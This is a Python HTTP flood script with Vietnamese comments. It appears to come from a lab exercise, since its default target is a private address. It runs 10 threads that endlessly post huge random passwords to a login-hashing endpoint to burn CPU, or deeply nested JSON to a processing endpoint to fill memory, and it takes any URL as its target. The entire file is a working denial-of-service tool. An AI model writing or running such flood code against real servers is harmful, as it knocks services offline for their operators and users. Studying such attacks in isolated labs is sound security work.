import requests
import sys
import urllib3
import random
import string
import threading
import json
import os
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Parse command line arguments
# Cú pháp: python http_flood.py [target] [attack_type]
#   target: URL (http://...) hoặc IP, hoặc 'hash'/'json' để dùng default
#   attack_type: 'hash' hoặc 'json'

if len(sys.argv) > 1:
    arg1 = sys.argv[1]
    # Nếu arg1 là hash hoặc json -> dùng default target, arg1 là attack_type
    if arg1 in ['hash', 'json']:
        target = "http://10.0.0.11:8000"  # Default: web1 trực tiếp
        attack_type = arg1
    else:
        # arg1 là target
        target = arg1
        if not target.startswith('http://') and not target.startswith('https://'):
            target = f"http://{target}:8000"
        # arg2 là attack_type (nếu có)
        attack_type = sys.argv[2] if len(sys.argv) > 2 else "hash"
else:
    target = "http://10.0.0.11:8000"
    attack_type = "hash"

print(f"[HTTP_FLOOD] Target: {target} | Attack: {attack_type}")

print(f"[HTTP_FLOOD] Process {os.getpid()} - Kiểu: {attack_type.upper()} - Target: {target}")

# Hàm tạo payload
def generate_long_string(min_len=1000, max_len=5000):
    """Tạo chuỗi ngẫu nhiên với độ dài biến thiên"""
    length = random.randint(min_len, max_len)
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def generate_deep_json():
    """Tạo cấu trúc JSON lồng nhau ngẫu nhiên để tấn công RAM"""
    depth = random.randint(5, 15)
    breadth = random.randint(2, 4)
    dummy_dict = {}
    current_level = dummy_dict
    for i in range(depth):
        current_level[f"level_{i}"] = {}
        for j in range(breadth):
            current_level[f"level_{i}"][f"data_{j}"] = generate_long_string(50, 200)
        current_level = current_level[f"level_{i}"]
    return dummy_dict

def blast_hash():
    """Tấn công CPU: Gửi request hash liên tục"""
    count = 0
    while True:
        try:
            # Payload 12000 - hash ~1-1.5s, cực kỳ tốn CPU, đủ lâu để giữ server bận
            data = {'password': generate_long_string(12000, 12000)}
            url = f"{target.rstrip('/')}/api/hash_login"
            # Timeout 30s - đợi server xử lý kể cả khi bị tấn công nặng
            r = requests.post(url, data=data, verify=False, timeout=30)
            count += 1
            if count <= 5:  # Chỉ log 5 lần đầu
                print(f"[BLAST_HASH] Request #{count} sent to {url}, status: {r.status_code}")
        except Exception as e:
            if count <= 5:
                print(f"[BLAST_HASH] Error: {e}")
        # Nghỉ 5ms - gần như không nghỉ, luôn gửi request mới
        time.sleep(0.005)

def blast_json():
    """Tấn công RAM: Gửi payload JSON lớn"""
    while True:
        try:
            payload = generate_deep_json()
            headers = {'Content-Type': 'application/json'}
            requests.post(f"{target.rstrip('/')}/api/process_json", json=payload, headers=headers, verify=False, timeout=3)
        except Exception:
            pass
        # Nghỉ 200ms giữa các request JSON (tạo nhanh hơn vì server chỉ lưu vào memory)
        time.sleep(0.2)

# Chọn hàm tấn công theo loại
if attack_type == "hash":
    print("[*] Tấn công CPU (Hash) - Đánh vào /api/hash_login")
    target_func = blast_hash
elif attack_type == "json":
    print("[*] Tấn công RAM (JSON) - Đánh vào /api/process_json")
    target_func = blast_json
else:
    print(f"[*] Không xác định kiểu '{attack_type}', mặc định dùng hash")
    target_func = blast_hash

# Tạo 10 threads - luôn có nhiều request đang chờ server xử lý
for _ in range(10):
    threading.Thread(target=target_func, daemon=True).start()

try:
    # Giữ script chạy mãi mãi
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print(f"\n[*] Đã dừng tấn công HTTP.")
